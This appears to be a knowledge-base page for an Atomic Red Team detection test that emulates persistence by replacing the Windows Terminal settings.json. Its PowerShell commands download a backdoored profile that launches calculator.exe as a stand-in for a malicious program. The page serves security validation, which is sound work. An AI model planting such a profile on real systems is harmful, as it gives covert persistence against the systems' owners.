---
atomic_guid: "ec5d76ef-82fe-48da-b931-bdb25a62bc65"
title: "Persistence by modifying Windows Terminal profile"
framework: "atomic"
generated: "true"
attack_technique_id: "T1547.015"
attack_technique_name: "Boot or Logon Autostart Execution: Login Items"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.015/T1547.015.yaml"
build_date: "2026-04-26 14:38:40"
executor: "powershell"
aliases:
  - "ec5d76ef-82fe-48da-b931-bdb25a62bc65"
  - "Persistence by modifying Windows Terminal profile"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Persistence by modifying Windows Terminal profile

Modify Windows Terminal settings.json file to gain persistence. [Twitter Post](https://twitter.com/nas_bench/status/1550836225652686848)

## Metadata

- Atomic GUID: ec5d76ef-82fe-48da-b931-bdb25a62bc65
- Technique: T1547.015: Boot or Logon Autostart Execution: Login Items
- Platforms: windows
- Executor: powershell
- Dependency Executor: powershell
- Source Path: atomics/T1547.015/T1547.015.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1547-boot_or_logon_autostart_execution|T1547.015]]

## Input Arguments

### calculator

- description: Test program used to imitate a maliciously called program.
- type: string
- default: calculator.exe

### settings_json_def

- description: Default file for Windows Terminal to replace the default profile with a backdoor to call another program.
- type: path
- default: ~\AppData\Local\Packages\Microsoft.WindowsTerminal_8wekyb3d8bbwe\LocalState\settings.json

### settings_json_tmp

- description: Temp file for Windows Terminal.
- type: path
- default: ~\AppData\Local\Temp\settings.json

### wt_exe

- description: Windows Terminal executable.
- type: path
- default: ~\AppData\Local\Microsoft\WindowsApps\Microsoft.WindowsTerminal_8wekyb3d8bbwe\wt.exe

## Dependencies

Windows Terminal must be installed

### Prerequisite Check

```text
if (Test-Path #{wt_exe}) {exit 0} else {exit 1}
```

### Get Prerequisite

```text
$(rm ~\AppData\Local\Packages\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\LocalState\StoreEdgeFD\installed.db -ErrorAction Ignore; Write-Output ""; $?) -and $(winget install --id=Microsoft.WindowsTerminal)
```

## Executor

- name: powershell

### Command

```powershell
mv #{settings_json_def} #{settings_json_tmp}
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.015/src/settings.json?raw=true" -OutFile "#{settings_json_def}"
wt.exe
```

### Cleanup

```powershell
mv -Force #{settings_json_tmp} #{settings_json_def}
taskkill /F /IM "#{calculator}" > $null
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.015/T1547.015.yaml)
